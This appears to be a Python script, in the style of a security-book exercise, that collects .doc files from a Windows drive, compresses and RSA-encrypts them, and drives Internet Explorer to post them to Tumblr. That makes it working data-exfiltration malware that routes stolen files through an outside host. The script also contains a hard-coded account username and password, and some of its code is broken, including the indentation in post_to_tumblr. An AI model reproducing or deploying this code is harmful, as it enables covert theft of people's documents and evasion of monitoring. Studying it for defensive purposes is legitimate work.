import win32com.client
import os
import fnmatch
import time
import random
import zlib

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

doc_type = ".doc"
username = "jms@bughunter.ca"
password="justinBHP2014"
public_key = '''-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAoZESfhGcbVFafXYheQu4
23zXijSAchO7LHdIAGSSvOGG3A5py6t4cCzzssgs/NtlJwAOZb6JFNAoo4SxvWkx
zmaqTpnDGqV9pzS7aZiyj7g/E7oYwIX8x5aVmFT3V7b7QXhNYpv0kYveIT5K7rxY
mybzmesARiyr3EdT3rUtmOV0TjD9PIM7v1xLzkI9g12BCqTGhMNsURQ+FZphadh/
Cxnvaxbw8NFgXKCbidBvB0sng7iBmy2Fd6mUJkQM5wL7FF/joeVgLX+kirfe9qk0
kewSuS3bwMHeKgT6I6uaZf+YVJsdzD3Pyxe3WX0kYZ3VA8hp1dXfCAR1Cu4iuwTi
6QIDAQAB
-----END PUBLIC KEY-----'''


def wait_for_browser(browser):
    while browser.ReadyState!=4 and browser.ReadyState!="complete":
        time.sleep(0.1)


# encrypt the filename and file content
def encrypt_string(plaintext):
    # using PKCS1_OAEP,the size of block to be encrypted must less than key size minus 41
    # here ,chunk_size < 2048/8 -41 =215
    chunk_size=200
    print("Compressing:%d bytes"%len(plaintext))
    plaintext=zlib.compress(plaintext)

    print("Encrypting %d bytes"%len(plaintext))
    rsakey=RSA.importKey(public_key)
    rsakey=PKCS1_OAEP.new(rsakey)

    encrypted=b""
    offset=0
    print(plaintext)
    while offset<len(plaintext):
        chunk = plaintext[offset:offset+chunk_size]
        if len(chunk)%chunk_size!=0:
            chunk+=b" "*(chunk_size-len(chunk))
        print(chunk)
        encrypted+=rsakey.encrypt(chunk)
        offset+=chunk_size

    # encrypted=encrypted.decode(encoding="utf8").encode("base64")
    print("Base64 encoded crypto:%d"%len(encrypted))
    print(encrypted)
    return encrypted


def encrypt_post(filename):
    with open(filename,"rb") as f:
        contents=f.read()
    encrypted_title = encrypt_string(filename)
    encrypted_body=encrypt_string(contents)

    return encrypted_title,encrypted_body


def random_sleep():
    time.sleep(random.randint(5,10))


def login_to_tumblr(ie):
    full_doc = ie.Document.all
    for i in full_doc:
        if i.id == "signup_email":
            i.setAttribute("value",username)
        elif i.id == "signup_password":
            i.setAttribute("value",password)
    random_sleep()

    if ie.Document.forms[0].id == "signup_form":
        ie.Document.forms[0].submit()
    else:
        ie.Document.forms[1].submit()
    random_sleep()
    wait_for_browser(ie)


def post_to_tumblr(ie,title,post):
    full_doc = ie.Document.all
    for i in full_doc:
        if i.id == "post_one":
            i.setAttribute("value",title)
            title_box = i
        elif i.id == "post_two":
            i.setAttribute("innerHTML",post)
        elif i.id == "create_post":
            print("Found post button")
            post_form = i
            i.focus()
        random_sleep()
        title_box.focus()
        random_sleep()

        post_form.children[0].click()
        wait_for_browser(ie)
        random_sleep()


def exfiltrate(document_path):
    ie=win32com.client.Dispatch("InternetExplorer.Application")
    ie.Visible=1

    ie.Navigate("http://www.tumblr.com/login")
    wait_for_browser(ie)

    print("logging in...")
    login_to_tumblr(ie)
    ie.Navigate("http://www.tumblr.com/new/text")
    wait_for_browser(ie)

    title,body=encrypt_post(document_path)
    print("creating new post...")
    post_to_tumblr(ie,title,body)
    print("Posted!")

    ie.Quit()
    ie=None


if __name__ == '__main__':
    # for parent,directories,filenames in os.walk("C:\\"):
    #     for filename in fnmatch.filter(filenames,"*%s"%doc_type):
    #         document_path=os.path.join(parent,filename)
    #         print("Found:%s"%document_path)
    #         exfiltrate(document_path)
    #         input("continue?")

    encrypt_string(b"helloworld")
